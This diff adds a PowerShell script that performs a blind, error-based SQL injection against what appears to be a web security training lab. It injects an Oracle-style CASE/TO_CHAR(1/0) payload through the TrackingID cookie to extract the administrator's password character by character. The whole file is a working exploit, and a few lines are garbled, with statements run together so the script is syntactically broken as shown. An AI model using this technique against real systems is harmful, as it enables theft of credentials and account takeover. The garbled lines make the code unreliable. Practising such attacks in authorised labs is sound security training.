@@ -1,0 +1,25 @@
+$foundString=''
+$testString='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+$URL='https://0a300015036e5efdc028612500ac0080.web-security-academy.net/'$trackingID=''
+Invoke-WebRequest -Uri $URL -SessionVariable websession
+$cookies=$websession.Cookies.GetCookies($URL)
+$trackingID=$cookies.Item("TrackingID").Value
+$trackingIDfor($i=1;$i -lt 22;$i++)
+{
+    for ($j=0;$j -lt $testString.Length;$j++)
+    {
+      $query="'||(SELECT+CASE+WHEN+(substr(password,$i,1)%3d'"+$testString[$j]+"')+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'"
+      $cookies.Item("TrackingID").Value = $trackingID+$query
+     
+    try
+    {
+       $w=Invoke-WebRequest -Uri $URL -WebSession $websession
+    }
+    catch [System.Net.WebException]
+    {
+   $foundString+=$testString[$j]
+    break
+    }
+    }
+    
+    $foundString}
